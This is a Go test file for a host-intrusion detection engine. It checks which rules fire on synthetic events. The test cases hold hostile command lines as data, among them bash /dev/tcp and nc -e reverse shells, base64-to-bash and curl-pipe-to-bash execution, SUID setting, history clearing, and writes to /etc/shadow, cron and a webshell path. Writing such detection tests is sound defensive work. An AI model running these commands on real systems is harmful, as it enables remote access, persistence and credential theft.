package detect

import (
	"slices"
	"testing"
	"time"

	"sentinelx/backend/correlate"
)

func mkEngine(t *testing.T) *Engine {
	t.Helper()
	e, err := NewEngine(Default())
	if err != nil {
		t.Fatalf("compile rules: %v", err)
	}
	return e
}

func TestRulesFireExpected(t *testing.T) {
	e := mkEngine(t)
	cases := []struct {
		name string
		ev   correlate.Event
		want []string // exact set of rule ids expected to fire, order-independent; nil = none
	}{
		{"curl download", correlate.Event{ID: "1", Type: correlate.ProcessStart, ProcImage: "/usr/bin/curl", Cmdline: "/usr/bin/curl http://x/y -o /tmp/z"}, []string{"lolbin_curl_download"}},
		{"wget download", correlate.Event{ID: "2", Type: correlate.ProcessStart, ProcImage: "/usr/bin/wget", Cmdline: "/usr/bin/wget http://x/y"}, []string{"lolbin_curl_download"}},
		{"chmod +x", correlate.Event{ID: "3", Type: correlate.ProcessStart, ProcImage: "/usr/bin/chmod", Cmdline: "/usr/bin/chmod +x /tmp/z"}, []string{"chmod_then_exec"}},
		{"exec from tmp", correlate.Event{ID: "4", Type: correlate.ProcessStart, ProcImage: "/tmp/payload"}, []string{"exec_from_tmp"}},
		{"benign ls", correlate.Event{ID: "5", Type: correlate.ProcessStart, ProcImage: "/usr/bin/ls", Cmdline: "/usr/bin/ls -la"}, nil},
		{"curl but not exec event", correlate.Event{ID: "6", Type: correlate.NetConnect, ProcImage: "/usr/bin/curl"}, nil},

		{"bash -i reverse shell", correlate.Event{ID: "7", Type: correlate.ProcessStart, ProcImage: "/bin/bash", Cmdline: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, []string{"reverse_shell_pattern"}},
		{"nc -e reverse shell", correlate.Event{ID: "8", Type: correlate.ProcessStart, ProcImage: "/usr/bin/nc", Cmdline: "nc -e /bin/sh 10.0.0.1 4444"}, []string{"reverse_shell_pattern"}},
		{"base64 decode", correlate.Event{ID: "9", Type: correlate.ProcessStart, ProcImage: "/usr/bin/bash", Cmdline: "echo cGF5bG9hZA== | base64 -d | bash"}, []string{"base64_decode_exec"}},
		{"history clear", correlate.Event{ID: "10", Type: correlate.ProcessStart, ProcImage: "/bin/bash", Cmdline: "history -c"}, []string{"history_clearing"}},
		{"suid chmod", correlate.Event{ID: "11", Type: correlate.ProcessStart, ProcImage: "/usr/bin/chmod", Cmdline: "chmod u+s /usr/bin/find"}, []string{"suid_bit_set"}},
		{"suid chmod octal", correlate.Event{ID: "12", Type: correlate.ProcessStart, ProcImage: "/usr/bin/chmod", Cmdline: "chmod 4755 /usr/bin/find"}, []string{"suid_bit_set"}},
		{"nmap scan", correlate.Event{ID: "13", Type: correlate.ProcessStart, ProcImage: "/usr/bin/nmap", Cmdline: "nmap -sV 10.0.0.0/24"}, []string{"network_scanner_exec"}},
		// curl piped into bash legitimately also matches lolbin_curl_download (curl
		// process + "http" in cmdline) — a real, intentional overlap: both signals
		// are independently true of this event, not a test bug.
		{"curl pipe to bash", correlate.Event{ID: "14", Type: correlate.ProcessStart, ProcImage: "/usr/bin/curl", Cmdline: "curl http://x/install.sh | bash"}, []string{"lolbin_curl_download", "pipe_to_shell_install"}},

		{"authorized_keys write", correlate.Event{ID: "15", Type: correlate.FileWrite, ProcImage: "/bin/bash", FilePath: "/home/user/.ssh/authorized_keys"}, []string{"ssh_authorized_keys_write"}},
		{"shadow write", correlate.Event{ID: "16", Type: correlate.FileWrite, ProcImage: "/bin/bash", FilePath: "/etc/shadow"}, []string{"passwd_shadow_write"}},
		{"cron write", correlate.Event{ID: "17", Type: correlate.FileWrite, ProcImage: "/bin/bash", FilePath: "/etc/cron.d/persist"}, []string{"cron_persistence_write"}},
		{"webshell drop", correlate.Event{ID: "18", Type: correlate.FileWrite, ProcImage: "/bin/bash", FilePath: "/var/www/html/shell.php"}, []string{"webshell_drop"}},
		{"benign file write", correlate.Event{ID: "19", Type: correlate.FileWrite, ProcImage: "/bin/bash", FilePath: "/tmp/notes.txt"}, nil},

		{"ssh key read", correlate.Event{ID: "20", Type: correlate.FileRead, ProcImage: "/usr/bin/cat", FilePath: "/home/user/.ssh/id_rsa"}, []string{"credential_file_read"}},
		{"benign file read", correlate.Event{ID: "21", Type: correlate.FileRead, ProcImage: "/usr/bin/cat", FilePath: "/etc/hostname"}, nil},

		{"c2 port connect", correlate.Event{ID: "22", Type: correlate.NetConnect, ProcImage: "/tmp/payload", RemotePort: 4444}, []string{"suspicious_c2_port"}},
		{"benign port connect", correlate.Event{ID: "23", Type: correlate.NetConnect, ProcImage: "/usr/bin/curl", RemotePort: 443}, nil},

		{"ngrok dns", correlate.Event{ID: "24", Type: correlate.DNSQuery, ProcImage: "/tmp/payload", DNSName: "abc123.ngrok.io"}, []string{"dns_tunneling_provider"}},
		{"benign dns", correlate.Event{ID: "25", Type: correlate.DNSQuery, ProcImage: "/usr/bin/curl", DNSName: "example.com"}, nil},

		{"module from tmp", correlate.Event{ID: "26", Type: correlate.ModuleLoad, ProcImage: "/sbin/insmod", FilePath: "/tmp/rootkit.ko"}, []string{"suspicious_kernel_module_load"}},
		{"module from lib", correlate.Event{ID: "27", Type: correlate.ModuleLoad, ProcImage: "/sbin/modprobe", FilePath: "/lib/modules/6.1.0/kernel/x.ko"}, nil},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := e.Eval(c.ev)
			gotIDs := make([]string, len(got))
			for i, d := range got {
				gotIDs[i] = d.RuleID
			}
			slices.Sort(gotIDs)
			want := slices.Clone(c.want)
			slices.Sort(want)
			if !slices.Equal(gotIDs, want) {
				t.Fatalf("want rules %v, got %v", want, gotIDs)
			}
			for _, d := range got {
				if len(d.Technique) == 0 || d.EventIDs[0] != c.ev.ID {
					t.Fatalf("detection missing technique/eventid: %+v", d)
				}
			}
		})
	}
}

func TestDetectionIDsUnique(t *testing.T) {
	e := mkEngine(t)
	seen := map[int64]bool{}
	for range 5 {
		for _, d := range e.Eval(correlate.Event{ID: "x", Type: correlate.ProcessStart, ProcImage: "/tmp/p", TS: time.Now()}) {
			if seen[d.ID] {
				t.Fatalf("duplicate detection id %d", d.ID)
			}
			seen[d.ID] = true
		}
	}
}

func TestTechniqueCoverage(t *testing.T) {
	e := mkEngine(t)
	techs := e.Techniques()
	if len(techs) < 15 {
		t.Fatalf("expected >=15 techniques covered by the broadened ruleset, got %d: %v", len(techs), techs)
	}
}
